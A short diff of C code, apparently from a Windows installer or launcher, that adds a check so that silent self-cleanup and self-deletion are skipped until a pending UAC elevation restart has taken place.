@@ -2895,12 +2895,13 @@ done:
         h_uninstall_proxy(options);
         h_proxy_auto_installed = FALSE;
     }
-    if (options->deleteSuspend && h_silent_active && !h_silent_done) {
+    /* UAC 重启还要用当前 EXE 路径；提权交接前不能改名/删除自身。 */
+    if (options->deleteSuspend && h_silent_active && !h_silent_done && !h_needs_elevation) {
         h_silent_cleanup_pass(TRUE);
         if (h_silent_parked[0]) { cx_cleanup_release_self(h_silent_parked); h_silent_parked[0] = 0; }
         h_silent_done = TRUE;
     }
-    if (options->silentScenario && h_silent_active && !h_silent_done) {
+    if (options->silentScenario && h_silent_active && !h_silent_done && !h_needs_elevation) {
         h_silent_cleanup_pass(TRUE);
         if (h_silent_parked[0]) { cx_cleanup_release_self(h_silent_parked); h_silent_parked[0] = 0; }
         h_silent_done = TRUE;
